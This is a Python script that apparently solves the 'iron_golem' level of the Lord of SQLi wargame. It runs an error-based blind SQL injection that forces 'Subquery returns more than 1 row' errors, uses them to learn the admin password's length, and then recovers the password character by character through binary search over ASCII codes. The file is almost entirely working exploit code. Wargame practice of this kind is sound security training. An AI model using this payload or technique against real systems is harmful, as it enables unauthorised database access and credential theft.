import requests
import os

URL_ID=os.environ['URL_ID']
PHPSESSID=os.environ['PHPSESSID']

url = f"https://los.rubiya.kr/chall/iron_golem_{URL_ID}.php"
cookie = {'PHPSESSID': PHPSESSID}


pw_length = 0

for  i in range(1, 100):

    res = requests.get(url, params={'pw': f'\' or id =\'admin\' and if({i} < length(pw), (select 1 union select 2), 2) and \'1\'=\'1'},cookies=cookie)

    if res.text.startswith("Subquery returns more than"):
        pw_length = i + 1
    else:
        break

print(f"pw length: {pw_length}")

ans = ""

for i in range(0, pw_length):
    min_code = 0
    max_code = 256
    while min_code + 1 != max_code:
        target = (min_code + max_code) // 2
        res = requests.get(url, params={'pw': f'\' or id =\'admin\' and if({target} <= ascii(substr(pw,{i+1},1)), (select 1 union select 2), 2) and \'1\'=\'1'},cookies=cookie)

        if res.text.startswith("Subquery returns more than") > 0:
            min_code = target
        else:
            max_code = target

    ans += str(chr(min_code))
    print(f"(in progress)ans: {ans}")

res = requests.get(url, params={'pw': ans},cookies=cookie)

if res.text.find("Clear") > 0:
    print("Clear!")
else:
    print("Failed")
